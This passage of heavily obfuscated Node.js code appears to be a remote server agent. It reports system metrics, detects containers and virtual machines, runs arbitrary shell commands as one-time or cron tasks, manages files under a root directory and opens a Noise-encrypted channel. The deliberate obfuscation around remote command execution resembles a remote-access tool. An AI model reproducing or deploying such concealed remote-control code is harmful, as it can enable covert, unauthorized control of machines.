                'load5': a[ax(0x3f0)](Math[ax(0x3a0)](a[ax(0x404)](f[ax(0x13c)], 0x64)), 0x64),
                'load15': a[ax(0x2a6)](Math['round'](a[ax(0x404)](f['avgLoad'], 0x64)), 0x64)
            },
            'disk': await this[ax(0x3d9)](),
            'network': {
                'up': Math[ax(0x3a0)](a[ax(0x3f0)](j, i)),
                'down': Math[ax(0x3a0)](a[ax(0x238)](k, i)),
                'totalUp': this[ax(0x370)],
                'totalDown': this[ax(0x2db)]
            },
            'connections': await this[ax(0x2a7)](),
            'uptime': a0k[ax(0x1d4)](),
            'process': l?.[ax(0x3bd)] || 0x0,
            'message': ''
        };
    }
    async ['_getVirtualization']() {
        const ay = a0U, a = {
                'DUVQj': '/.dockerenv',
                'uuslR': ay(0x2a2),
                'gPaou': ay(0x30d),
                'PZRjP': ay(0x1de),
                'vWgEc': ay(0x2ed),
                'cwZxK': ay(0x215),
                'blhhb': ay(0x299),
                'PsGxg': 'kubepods',
                'vVYZM': ay(0x2e9),
                'HQTQB': ay(0x1c9),
                'cdEWy': ay(0x3f5),
                'Iavha': ay(0x1f2),
                'lySaR': ay(0x400),
                'DCDmv': ay(0x3fc),
                'ybJHx': '/proc/1/environ',
                'wnhek': 'container=lxc',
                'tdEVu': ay(0x20b),
                'nHzhr': 'QEMU',
                'BEHeG': ay(0x2a9),
                'eKqzL': ay(0x36c)
            };
        try {
            if (a0h[ay(0x1c0)](a[ay(0x371)]))
                return a[ay(0x24c)];
            if (a0h[ay(0x1c0)](a[ay(0x2b7)]))
                return a[ay(0x213)];
            if (a0h[ay(0x1c0)](a[ay(0x3f3)])) {
                const b = a0h[ay(0x2b1)](a['vWgEc'], a[ay(0x397)])[ay(0x318)]();
                if (b[ay(0x1fb)](a[ay(0x22e)]) || b[ay(0x1fb)](ay(0x172)))
                    return a[ay(0x24c)];
                else {
                    if (b[ay(0x1fb)](a[ay(0x1d8)]))
                        return ay(0x3fc);
                    else {
                        if (b[ay(0x1fb)](a[ay(0x31b)]))
                            return ay(0x20b);
                    }
                }
            }
            if (a0h[ay(0x1c0)](a[ay(0x39e)])) {
                const c = a0h['readFileSync'](a[ay(0x39e)], a[ay(0x397)]);
                if (c[ay(0x1fb)](ay(0x373)) || c['includes'](a[ay(0x2d1)]))
                    return a[ay(0x24c)];
                else {
                    if (c[ay(0x1fb)](a[ay(0x303)]) || c[ay(0x1fb)](a['lySaR']))
                        return a[ay(0x248)];
                }
            }
            if (a0h[ay(0x1c0)]('/proc/1/environ')) {
                const d = a0h[ay(0x2b1)](a[ay(0x15a)], a[ay(0x397)]);
                if (d[ay(0x1fb)](a[ay(0x3e2)]))
                    return a[ay(0x266)];
            }
            if (a0h[ay(0x1c0)](ay(0x28c))) {
                const f = a0h['readFileSync'](ay(0x28c), 'utf8');
                if (f['includes'](a[ay(0x2d9)]) || f[ay(0x1fb)](a[ay(0x132)]))
                    return a[ay(0x2d9)];
            }
        } catch (g) {
        }
        return a[ay(0x284)];
    }
    async [a0U(0x3d9)]() {
        const az = a0U, a = {
                'AFVYM': function (b, c) {
                    return b > c;
                },
                'CNaQY': function (b, c) {
                    return b !== c;
                },
                'eMAti': az(0x1d1),
                'pvFqs': 'overlay',
                'DdUea': az(0x27f)
            };
        try {
            const b = await a0n[az(0x386)](), c = b[az(0x35f)](g => {
                    const aA = az;
                    return a[aA(0x312)](g[aA(0x356)], 0x0) && a['CNaQY'](g[aA(0x295)], a['eMAti']) && g[aA(0x295)] !== a[aA(0x3c8)] && g['fs'][aA(0x3c3)](a[aA(0x3f4)]);
                }), d = c[az(0x38a)]((g, h) => g + h[az(0x356)], 0x0), f = c[az(0x38a)]((g, h) => g + h[az(0x178)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0U(0x2a7)]() {
        const aB = a0U;
        try {
            const a = await a0n[aB(0x10e)](), b = a['filter'](d => d[aB(0x2fa)] === 'tcp')['length'], c = a[aB(0x35f)](d => d['protocol'] === 'udp')[aB(0x3d0)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0J {
    static async [a0U(0x376)](a, b = {}) {
        const aC = a0U, c = {
                'XNDQi': function (d, f) {
                    return d - f;
                },
                'TrOyq': function (d, f) {
                    return d || f;
                },
                'pQmNw': function (d, f) {
                    return d === f;
                },
                'opZSu': function (d, f) {
                    return d(f);
                },
                'kjZcH': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'XiJrD': function (d, f) {
                    return d * f;
                },
                'FUjBk': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[aC(0x1b6)](),
                env: env = {},
                timeout: timeout = a0F[aC(0x2b3)]
            } = b;
        return new Promise(d => {
            const aD = aC, f = Date[aD(0x405)](), g = c[aD(0x2d2)](a0l, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[aD(0x33f)](timeout, 0x3e8),
                    'maxBuffer': c[aD(0x33f)](c[aD(0x2c3)](0xa, 0x400), 0x400)
                }, (h, i, j) => {
                    const aE = aD, k = c[aE(0x2bb)](Date[aE(0x405)](), f), l = h && h[aE(0x222)] && h[aE(0x33c)];
                    let m = c[aE(0x2e6)](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[aE(0x3fb)](typeof h['code'], aE(0x217)) ? n = h[aE(0x1c7)] : n = -0x1;
                    }
                    c[aE(0x29b)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
class a0K {
    static async [a0U(0x3d2)](a, b = ![]) {
        const aF = a0U, c = {
                'uimlM': 'directory',
                'zesHu': aF(0x362),
                'gdWYL': function (h, i) {
                    return h & i;
                },
                'qZLHK': function (h, i) {
                    return h(i);
                },
                'LwWad': function (h, i) {
                    return h || i;
                },
                'OmdfZ': 'Access\x20denied:\x20path\x20outside\x20root',
                'aSNdI': aF(0x2bc)
            }, d = a0j[aF(0x3f9)](a0F[aF(0x365)], c[aF(0x1bb)](a, '.'));
        if (!d[aF(0x3c3)](a0F[aF(0x365)]))
            throw new Error(c['OmdfZ']);
        if (!a0h[aF(0x1c0)](d))
            throw new Error(c[aF(0x351)]);
        const f = [], g = h => {
                const aG = aF, i = a0h[aG(0x1c4)](h);
                for (const j of i) {
                    const k = a0j[aG(0x117)](h, j), l = a0h[aG(0x285)](k), m = new a0B();
                    m[aG(0x29a)] = j, m[aG(0x11b)] = a0j['relative'](a0F[aG(0x365)], k), m[aG(0x295)] = l[aG(0x26f)]() ? c[aG(0x23a)] : c[aG(0x298)], m[aG(0x356)] = l[aG(0x356)], m[aG(0x355)] = l[aG(0x355)][aG(0x11a)](), m[aG(0x2cf)] = this[aG(0x1f3)](l[aG(0x2cf)], l[aG(0x26f)]()), m['mode_octal'] = '0o' + c[aG(0x3cc)](l[aG(0x2cf)], 0x1ff)[aG(0x3f1)](0x8), m[aG(0x301)] = l[aG(0x170)] + ':' + l[aG(0x390)], f[aG(0x32e)](m), b && l['isDirectory']() && c[aG(0x39a)](g, k);
                }
            };
        return g(d), f;
    }
    static async [a0U(0x2bf)](a) {
        const aH = a0U, b = {
                'mLRxV': function (d, f) {
                    return d & f;
                },
                'vAzPH': aH(0x233)
            }, c = [];
        for (const d of a) {
            const f = a0j[aH(0x3f9)](a0F[aH(0x365)], d);
            if (!f[aH(0x3c3)](a0F[aH(0x365)]))
                continue;
            try {
                const g = a0h[aH(0x285)](f), h = this[aH(0x16d)](f, a0h[aH(0x3fe)][aH(0x3ab)]), i = this[aH(0x16d)](f, a0h[aH(0x3fe)][aH(0x368)]), j = this[aH(0x16d)](f, a0h[aH(0x3fe)][aH(0x257)]), k = new a0C();
                k[aH(0x11b)] = a0j[aH(0x384)](a0F[aH(0x365)], f), k['name'] = a0j['basename'](f), k[aH(0x2cf)] = this[aH(0x1f3)](g[aH(0x2cf)], g[aH(0x26f)]()), k['mode_octal'] = '0o' + b['mLRxV'](g['mode'], 0x1ff)[aH(0x3f1)](0x8), k['type'] = g['isDirectory']() ? b[aH(0x128)] : 'file', k['readable'] = h, k['writable'] = i, k[aH(0x2cb)] = j, c[aH(0x32e)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0U(0x16d)](a, b) {
        const aI = a0U;
        try {
            return a0h[aI(0x127)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0U(0x3b8)](a) {
        const aJ = a0U, b = {
                'BoCdB': function (c, d) {
                    return c === d;
                },
                'GNQkO': aJ(0x217),
                'kvbyK': aJ(0x3d5)
            };
        if (b[aJ(0x1b9)](typeof a, b[aJ(0x3a4)]))
            return a;
        if (typeof a === b[aJ(0x29e)]) {
            const c = a[aJ(0x19c)]();
            if (/^[0-7]{3,4}$/['test'](c))
                return parseInt(c, 0x8);
        }
        throw new Error(aJ(0x179));
    }
    static [a0U(0x1f3)](a, b) {
        const aK = a0U, c = {
                'Fmvdo': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)['toString'](0x8)[aK(0x282)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[aK(0x2c4)](parseInt, i, 0xa);
            h += f['map']((k, l) => j & 0x4 >> l ? k : '-')[aK(0x117)]('');
        }
        return h;
    }
    static async [a0U(0x1a2)](a, b = ![]) {
        const aL = a0U, c = {
                'KgjeO': function (g, h) {
                    return g(h);
                },
                'XRisj': function (g, h) {
                    return g(h);
                },
                'CzwSS': aL(0x264),
                'hMddb': aL(0x1a3)
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0j[aL(0x3f9)](a0F[aL(0x365)], g);
            if (!i['startsWith'](a0F['FILE_ROOT'])) {
                d['push']({
                    'path': g,
                    'requested': c[aL(0x180)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['CzwSS']
                });
                continue;
            }
            try {
                const j = this[aL(0x3b8)](h), k = m => {
                        const aM = aL;
                        a0h[aM(0x2c8)](m, j);
                    };
                if (b && a0h[aL(0x1c0)](i) && a0h[aL(0x285)](i)['isDirectory']()) {
                    const m = n => {
                        const aN = aL;
                        c[aN(0x279)](k, n);
                        const o = a0h[aN(0x1c4)](n);
                        for (const p of o) {
                            const q = a0j[aN(0x117)](n, p);
                            a0h['statSync'](q)[aN(0x26f)]() ? c[aN(0x180)](m, q) : c['XRisj'](k, q);
                        }
                    };
                    c['XRisj'](m, i);
                } else
                    c['KgjeO'](k, i);
                const l = j['toString'](0x8);
                d[aL(0x32e)]({
                    'path': g,
                    'requested': c['XRisj'](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[aL(0x32e)]({
                    'path': g,
                    'requested': c['XRisj'](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[aL(0x381)],
                    'message': n[aL(0x3d7)]
                });
            }
        }
        const f = d[aL(0x35f)](o => o[aL(0x271)] === 'ok')[aL(0x3d0)];
        return {
            'status': 'ok',
            'total': d[aL(0x3d0)],
            'success': f,
            'results': d
        };
    }
    static async ['readFile'](a) {
        const aO = a0U, b = {
                'fVTNl': aO(0x189),
                'xvndo': function (h, i) {
                    return h > i;
                },
                'DFVop': function (h, i) {
                    return h * i;
                },
                'LJUln': aO(0x137),
                'WRNuG': aO(0x215),
                'Sutzw': 'base64',
                'smSOr': aO(0x1fe)
            }, c = a0j['resolve'](a0F[aO(0x365)], a);
        if (!c[aO(0x3c3)](a0F[aO(0x365)]))
            throw new Error(b['fVTNl']);
        const d = a0h[aO(0x285)](c);
        if (b['xvndo'](d[aO(0x356)], b[aO(0x28d)](0x400, 0x400)))
            throw new Error(b[aO(0x214)]);
        const f = a0h[aO(0x2b1)](c), g = this[aO(0x17c)](f);
        return {
            'status': 'ok',
            'path': a0j[aO(0x384)](a0F['FILE_ROOT'], c),
            'content': g ? a0p['fromByteArray'](f) : f['toString'](b[aO(0x1a9)]),
            'encoding': g ? b['Sutzw'] : b[aO(0x16e)],
            'is_binary': g,
            'size': d[aO(0x356)]
        };
    }
    static [a0U(0x17c)](a) {
        const aP = a0U, b = {
                'LARMN': function (c, d) {
                    return c === d;
                },
                'aLTcX': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b[aP(0x27b)](a[aP(0x3d0)], 0x0))
            return ![];
        for (let c = 0x0; b[aP(0x350)](c, Math[aP(0x3c5)](a[aP(0x3d0)], 0x200)); c++) {
            if (b[aP(0x27b)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0U(0x302)](a, b, c, d = null, f = null) {
        const aQ = a0U, g = {
                'hkEnf': function (l, m) {
                    return l > m;
                },
                'aFdLc': aQ(0x137),
                'eFLyS': function (l, m) {
                    return l !== m;
                },
                'qMNTE': function (l, m) {
                    return l(m);
                },
                'wHbTC': aQ(0x21b),
                'odDIa': aQ(0x2cc),
                'omXBr': function (l, m) {
                    return l < m;
                }
            }, h = a0j[aQ(0x3f9)](a0F[aQ(0x365)], a);
        let j = h;
        b && (j = a0j['join'](h, b));
        if (!j['startsWith'](a0F['FILE_ROOT']))
            throw new Error(aQ(0x189));
        !a0h[aQ(0x1c0)](a0j[aQ(0x288)](j)) && a0h[aQ(0x163)](a0j[aQ(0x288)](j), { 'recursive': !![] });
        const k = a0p[aQ(0x3a3)](c);
        if (g['hkEnf'](k[aQ(0x3d0)], a0F[aQ(0x18b)]))
            throw new Error(g[aQ(0x34e)]);
        if (d !== null && g[aQ(0x2d3)](f, null)) {
            const l = Number(d), m = g['qMNTE'](Number, f);
            if (Number[aQ(0x2ad)](l) || Number[aQ(0x2ad)](m))
                throw new Error(g['wHbTC']);
            const n = a0j[aQ(0x117)](a0j[aQ(0x288)](j), g[aQ(0x24f)], a0j[aQ(0x3b6)](j));
            !a0h[aQ(0x1c0)](n) && a0h['mkdirSync'](n, { 'recursive': !![] });
            const o = a0j[aQ(0x117)](n, aQ(0x1db) + l);
            a0h[aQ(0x2e4)](o, k);
            const p = a0h[aQ(0x1c4)](n)['filter'](s => s[aQ(0x3c3)](aQ(0x1db))), q = p[aQ(0x3d0)], r = q === m;
            if (r) {
                const s = a0h[aQ(0x30e)](j);
                for (let t = 0x0; g[aQ(0x372)](t, m); t++) {
                    const u = a0j['join'](n, aQ(0x1db) + t);
                    if (!a0h[aQ(0x1c0)](u)) {
                        s[aQ(0x1ad)]();
                        throw new Error('Missing\x20chunk\x20' + t);
                    }
                    s[aQ(0x2f0)](a0h[aQ(0x2b1)](u));
                }
                s[aQ(0x31e)]();
                for (const v of a0h[aQ(0x1c4)](n)) {
                    a0h[aQ(0x277)](a0j[aQ(0x117)](n, v));
                }
                a0h[aQ(0x240)](n, { 'recursive': !![] });
            }
            return {
                'status': 'ok',
                'path': a0j[aQ(0x384)](a0F[aQ(0x365)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0h[aQ(0x2e4)](j, k), {
            'status': 'ok',
            'path': a0j[aQ(0x384)](a0F[aQ(0x365)], j),
            'received': k[aQ(0x3d0)],
            'total': k[aQ(0x3d0)],
            'chunked': ![]
        };
    }
    static async [a0U(0x207)](a) {
        const aR = a0U, b = { 'Ecmrw': 'Access\x20denied:\x20path\x20outside\x20root' }, c = a0j[aR(0x3f9)](a0F[aR(0x365)], a);
        if (!c[aR(0x3c3)](a0F[aR(0x365)]))
            throw new Error(b[aR(0x18a)]);
        if (!a0h[aR(0x1c0)](c))
            throw new Error(aR(0x2cd));
        const d = a0h[aR(0x285)](c), f = a0h[aR(0x2b1)](c), g = a0p[aR(0x36a)](f);
        return {
            'path': a0j['relative'](a0F[aR(0x365)], c),
            'content': g,
            'size': d[aR(0x356)]
        };
    }
    static async [a0U(0x357)](a) {
        const aS = a0U, b = {
                'vqghB': aS(0x264),
                'RcdtM': 'deleted',
                'sdcDw': aS(0x115)
            }, c = [];
        for (const d of a) {
            const f = a0j['resolve'](a0F['FILE_ROOT'], d);
            if (!f['startsWith'](a0F[aS(0x365)])) {
                c[aS(0x32e)]({
                    'path': d,
                    'status': b['vqghB']
                });
                continue;
            }
            try {
                if (a0h['existsSync'](f)) {
                    const g = a0h[aS(0x285)](f);
                    g['isDirectory']() ? a0h[aS(0x240)](f, { 'recursive': !![] }) : a0h['unlinkSync'](f), c['push']({
                        'path': d,
                        'status': b[aS(0x3c1)]
                    });
                } else
                    c[aS(0x32e)]({
                        'path': d,
                        'status': b[aS(0x25c)]
                    });
            } catch (h) {
                c[aS(0x32e)]({
                    'path': d,
                    'status': aS(0x1a3),
                    'message': h[aS(0x3d7)]
                });
            }
        }
        return c;
    }
    static async [a0U(0x36e)](a) {
        const aT = a0U, b = { 'JouIt': aT(0x1a3) }, c = [];
        for (const [d, f] of Object[aT(0x1e8)](a)) {
            const g = a0j['resolve'](a0F[aT(0x365)], d), h = a0j['resolve'](a0F[aT(0x365)], f);
            if (!g['startsWith'](a0F[aT(0x365)]) || !h['startsWith'](a0F[aT(0x365)])) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                const i = a0j[aT(0x288)](h);
                !a0h[aT(0x1c0)](i) && a0h[aT(0x163)](i, { 'recursive': !![] }), a0h[aT(0x315)](g, h), c[aT(0x32e)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[aT(0x1b1)],
                    'message': j['message']
                });
            }
        }
        return c;
    }
    static async ['copyFiles'](a) {
        const aU = a0U, b = {
                'SPmTH': function (d, f, g) {
                    return d(f, g);
                },
                'xVhEY': 'access_denied',
                'DvPfK': aU(0x115),
                'ZaUoB': function (d, f, g) {
                    return d(f, g);
                },
                'eTbTR': 'error'
            }, c = [];
        for (const [d, f] of Object[aU(0x1e8)](a)) {
            const g = a0j[aU(0x3f9)](a0F[aU(0x365)], d), h = a0j[aU(0x3f9)](a0F[aU(0x365)], f);
            if (!g[aU(0x3c3)](a0F[aU(0x365)]) || !h[aU(0x3c3)](a0F[aU(0x365)])) {
                c[aU(0x32e)]({
                    'from': d,
                    'to': f,
                    'status': b[aU(0x225)]
                });
                continue;
            }
            try {
                if (!a0h[aU(0x1c0)](g)) {
                    c[aU(0x32e)]({
                        'from': d,
                        'to': f,
                        'status': b[aU(0x2da)]
                    });
                    continue;
                }
                const i = a0j[aU(0x288)](h);
                !a0h[aU(0x1c0)](i) && a0h[aU(0x163)](i, { 'recursive': !![] });
                const j = a0h['statSync'](g);
                if (j[aU(0x26f)]()) {
                    if (a0h[aU(0x188)])
                        a0h[aU(0x188)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const aV = aU;
                            if (a0h[aV(0x285)](l)[aV(0x26f)]()) {
                                if (!a0h[aV(0x1c0)](m))
                                    a0h[aV(0x163)](m, { 'recursive': !![] });
                                for (const n of a0h[aV(0x1c4)](l)) {
                                    b[aV(0x24b)](k, a0j[aV(0x117)](l, n), a0j[aV(0x117)](m, n));
                                }
                            } else
                                a0h[aV(0x122)](l, m);
                        };
                        b[aU(0x3ae)](k, g, h);
                    }
                } else
                    a0h[aU(0x122)](g, h);
                c[aU(0x32e)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[aU(0x2d4)],
                    'message': l[aU(0x3d7)]
                });
            }
        }
        return c;
    }
    static async [a0U(0x1f8)](a) {
        const aW = a0U, b = { 'gkBEA': aW(0x189) }, c = a0j[aW(0x3f9)](a0F[aW(0x365)], a);
        if (!c[aW(0x3c3)](a0F['FILE_ROOT']))
            throw new Error(b['gkBEA']);
        return a0h[aW(0x163)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0j[aW(0x384)](a0F[aW(0x365)], c)
        };
    }
}
function a0b(a, b) {
    a = a - 0x109;
    const c = a0a();
    let d = c[a];
    if (a0b['JZiCfo'] === undefined) {
        var e = function (i) {
            const j = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let l = '', m = '';
            for (let n = 0x0, o, p, q = 0x0; p = i['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? l += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                p = j['indexOf'](p);
            }
            for (let r = 0x0, s = l['length']; r < s; r++) {
                m += '%' + ('00' + l['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(m);
        };
        a0b['XGydBZ'] = e, a0b['RygNVP'] = {}, a0b['JZiCfo'] = !![];
    }
    const f = c[0x0], g = a + f, h = a0b['RygNVP'][g];
    return !h ? (d = a0b['XGydBZ'](d), a0b['RygNVP'][g] = d) : d = h, d;
}
class a0L {
    static [a0U(0x2a8)] = new Map();
    static ['_appendLog'](a, b) {
        const aX = a0U, c = {
                'eQvQa': function (d, f) {
                    return d > f;
                },
                'yzyyr': function (d, f) {
                    return d - f;
                }
            };
        a[aX(0x32e)](b), c[aX(0x1f6)](a[aX(0x3d0)], a0F['MAX_TASK_LOG_SIZE']) && a['splice'](0x0, c[aX(0x2ef)](a[aX(0x3d0)], a0F[aX(0x31f)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const aY = a0U, g = new Date()['toISOString']();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + aY(0x2fe) + a + '\x20----\x20exitcode=' + c + '\x0a' + (b?.[aY(0x19c)]() || '')
        };
    }
    static [a0U(0x39c)]() {
        const aZ = a0U;
        return {
            'status': 'ok',
            'count': a0F[aZ(0x3a9)][aZ(0x3d0)],
            'tasks': a0F[aZ(0x3a9)]
        };
    }
    static async [a0U(0x402)](a) {
        const b0 = a0U, b = {
                'ADfid': 'onetime',
                'CmDvC': function (d, f) {
                    return d === f;
                }
            };
        a0F['onetasks'] = a || [], a0F['InitTask'] = !![];
        const c = [];
        for (let d = 0x0; d < a0F[b0(0x3a9)][b0(0x3d0)]; d++) {
            const f = a0F['onetasks'][d], g = await a0J[b0(0x376)](f), h = this[b0(0x37f)](f, g['result'], g[b0(0x25a)], b['ADfid']);
            this[b0(0x1a7)](a0F[b0(0x16c)], h), c[b0(0x32e)]({
                'index': d,
                'cmd': f,
                'exitcode': g[b0(0x25a)],
                'output': g['result'],
                'status': b[b0(0x1d3)](g[b0(0x25a)], 0x0) ? 'ok' : b0(0x1a3)
            });
        }
        return a0F['InitTask'] = ![], {
            'status': 'ok',
            'count': a0F[b0(0x3a9)][b0(0x3d0)],
            'tasks': a0F[b0(0x3a9)],
            'executed': c
        };
    }
    static [a0U(0x140)]() {
        const b1 = a0U;
        return {
            'status': 'ok',
            'count': Object[b1(0x399)](a0F[b1(0x138)])[b1(0x3d0)],
            'tasks': a0F['crontasks']
        };
    }
    static [a0U(0x3a2)](a) {
        const b2 = a0U, b = {
                'yHeFX': function (d, f) {
                    return d === f;
                },
                'AabSK': 'function',
                'Abeim': function (d, f) {
                    return d > f;
                },
                'INtKT': 'error',
                'FZMNs': function (d, f) {
                    return d - f;
                },
                'EDIvv': function (d, f) {
                    return d || f;
                },
                'TwykB': function (d, f) {
                    return d || f;
                },
                'wwNuU': function (d, f) {
                    return d > f;
                }
            };
        this[b2(0x2a8)]['forEach'](d => {
            const b3 = b2;
            b[b3(0x274)](typeof d[b3(0x330)], b[b3(0x1d6)]) && d[b3(0x330)](), typeof d[b3(0x216)] === b[b3(0x1d6)] && d['destroy']();
        }), this[b2(0x2a8)]['clear']();
        const c = [];
        for (const d of Object[b2(0x399)](a || {})) {
            !a0m[b2(0x387)](d) && c[b2(0x32e)](d);
        }
        if (b[b2(0x28e)](c[b2(0x3d0)], 0x0))
            return {
                'status': b[b2(0x3f7)],
                'message': 'Invalid\x20cron\x20expressions:\x20' + c[b2(0x117)](',\x20'),
                'valid_count': b[b2(0x116)](Object['keys'](b[b2(0x24e)](a, {}))['length'], c[b2(0x3d0)])
            };
        a0F[b2(0x138)] = b[b2(0x1cd)](a, {});
        for (const [f, g] of Object[b2(0x1e8)](a0F[b2(0x138)])) {
            const h = a0m[b2(0x2dd)](f, async () => {
                const b4 = b2, i = await a0J[b4(0x376)](g), j = this[b4(0x37f)](g, i['result'], i['exitcode'], b4(0x3b0), f);
                this[b4(0x1a7)](a0F[b4(0x1c8)], j);
            });
            this[b2(0x2a8)][b2(0x10c)](f, h);
        }
        return a0F[b2(0x1f1)] = b[b2(0x2f1)](Object[b2(0x399)](a0F[b2(0x138)])[b2(0x3d0)], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0F['crontasks'])['length'],
            'tasks': a0F[b2(0x138)]
        };
    }
    static [a0U(0x38e)]() {
        const b5 = a0U;
        return {
            'onetime': {
                'pending': a0F[b5(0x3b7)],
                'count': a0F[b5(0x3a9)][b5(0x3d0)]
            },
            'cron': {
                'active': a0F[b5(0x1f1)],
                'count': Object[b5(0x399)](a0F[b5(0x138)])[b5(0x3d0)],
                'check_interval': a0F['CRON_CHECK_INTERVAL']
            }
        };
    }
    static [a0U(0x2f5)](a = 0x32) {
        const b = a0F['onetimetasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b['length'],
            'logs': b
        };
    }
    static [a0U(0x407)](a = 0x32) {
        const b6 = a0U, b = a0F['crontasks_log'][b6(0x26a)](-a);
        return {
            'status': 'ok',
            'count': b[b6(0x3d0)],
            'logs': b
        };
    }
    static [a0U(0x193)]() {
        const b7 = a0U, a = a0F['onetimetasks_log'][b7(0x3d0)];
        return a0F[b7(0x16c)] = [], {
            'status': 'ok',
            'cleared': 'onetime'
        };
    }
    static [a0U(0x1e4)]() {
        const b8 = a0U, a = { 'VhIQK': b8(0x3b0) }, b = a0F['crontasks_log']['length'];
        return a0F[b8(0x1c8)] = [], {
            'status': 'ok',
            'cleared': a[b8(0x316)]
        };
    }
    static ['getLogSummary']() {
        const b9 = a0U, a = a0F[b9(0x16c)][b9(0x35f)](f => f[b9(0x25a)] === 0x0)['length'], b = a0F[b9(0x16c)][b9(0x3d0)] - a, c = a0F['crontasks_log'][b9(0x35f)](f => f[b9(0x25a)] === 0x0)[b9(0x3d0)], d = a0F[b9(0x1c8)][b9(0x3d0)] - c;
        return {
            'onetime': {
                'total_logged': a0F[b9(0x16c)][b9(0x3d0)],
                'max_capacity': a0F['MAX_TASK_LOG_SIZE'],
                'recent_success': a,
                'recent_failed': b
            },
            'cron': {
                'total_logged': a0F[b9(0x1c8)][b9(0x3d0)],
                'max_capacity': a0F[b9(0x31f)],
                'recent_success': c,
                'recent_failed': d
            }
        };
    }
    static async [a0U(0x28f)]() {
        const ba = a0U, a = {
                'YYnMM': function (c, d) {
                    return c < d;
                },
                'VcjVE': 'onetime'
            }, b = [];
        for (let c = 0x0; a[ba(0x3af)](c, a0F[ba(0x3a9)][ba(0x3d0)]); c++) {
            const d = a0F[ba(0x3a9)][c], f = await a0J['execute'](d), g = this[ba(0x37f)](d, f[ba(0x286)], f[ba(0x25a)], a[ba(0x3e6)]);
            this[ba(0x1a7)](a0F[ba(0x16c)], g), b[ba(0x32e)]({
                'cmd': d,
                'exitcode': f[ba(0x25a)],
                'output': f[ba(0x286)],
                'timeout': f[ba(0x37e)]
            });
        }
        return a0F[ba(0x3b7)] = ![], {
            'status': 'ok',
            'executed': b[ba(0x3d0)],
            'results': b
        };
    }
}
let a0M = null, a0N = null;
const a0O = new Promise((a, b) => {
    const bb = a0U, c = {
            'SIZao': bb(0x195),
            'tTwej': bb(0x2f8),
            'iMeDy': 'Noise\x20WASM\x20module\x20loaded\x20successfully',
            'UIbbw': function (d, f) {
                return d(f);
            },
            'EzaXM': function (d) {
                return d();
            }
        };
    try {
        c[bb(0x119)](a0r, function (d) {
            const bc = bb;
            if (!d) {
                a0N = new Error(c['SIZao']), a0v[bc(0x406)](c[bc(0x13e)], a0N[bc(0x3d7)]), a();
                return;
            }
            a0M = d, a0v[bc(0x3e1)](c[bc(0x3d4)]), a();
        });
    } catch (d) {
        a0N = d, a0v['warn'](bb(0x1e5), d[bb(0x3d7)]), c[bb(0x19d)](a);
    }
});
process['on']('unhandledRejection', (a, b) => {
    const bd = a0U, c = { 'nVGRc': bd(0x1bf) };
    a0v[bd(0x1a3)](c[bd(0x1a6)], a);
}), process['on'](a0U(0x329), a => {
    const be = a0U, b = { 'EamAG': be(0x109) };
    a0v[be(0x1a3)](b[be(0x337)], a), process['exit'](0x1);
});
class a0P {
    constructor(a, b, c) {
        const bf = a0U, d = { 'QcMxP': bf(0x33d) }, f = d[bf(0x167)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['isInitiator'] = a;
                continue;
            case '1':
                this[bf(0x3ad)] = c;
                continue;
            case '2':
                this[bf(0x2f9)] = b;
                continue;
            case '3':
                this['sendCipher'] = null;
                continue;
            case '4':
                this[bf(0x1ae)] = ![];
                continue;
            case '5':
                this['hs'] = null;
                continue;
            case '6':
                this[bf(0x3c6)] = null;
                continue;
            }
            break;
        }
    }
    async ['init']() {
        const bg = a0U, a = {
                'HDDbs': bg(0x360),
                'EqmyW': 'base64'
            };
        await a0O;
        if (!a0M)
            throw a0N || new Error(bg(0x1e2));
        const b = a0M, c = this[bg(0x2c7)] ? b['constants'][bg(0x1c5)] : b['constants']['NOISE_ROLE_RESPONDER'];
        this['hs'] = b[bg(0x1a5)](bg(0x336), c);
